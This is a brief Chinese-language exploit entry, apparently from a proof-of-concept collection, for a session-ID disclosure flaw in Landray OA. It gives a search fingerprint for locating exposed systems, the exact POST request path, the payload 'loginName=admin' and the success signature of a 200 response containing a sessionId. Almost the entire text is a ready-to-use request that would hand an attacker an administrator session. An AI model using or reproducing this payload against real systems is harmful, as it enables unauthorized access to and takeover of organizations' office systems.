# 蓝凌OA存在getLoginSessionId信息泄露漏洞

蓝凌 ｜ 信息泄露 ｜ —
- **指纹**：`app="Landray-OA系统"`
- **请求**：`POST /api///sys-authentication/loginService/getLoginSessionId HTTP/1.1`

**Payload**
```
loginName=admin
```
- **响应特征**：200 sessionId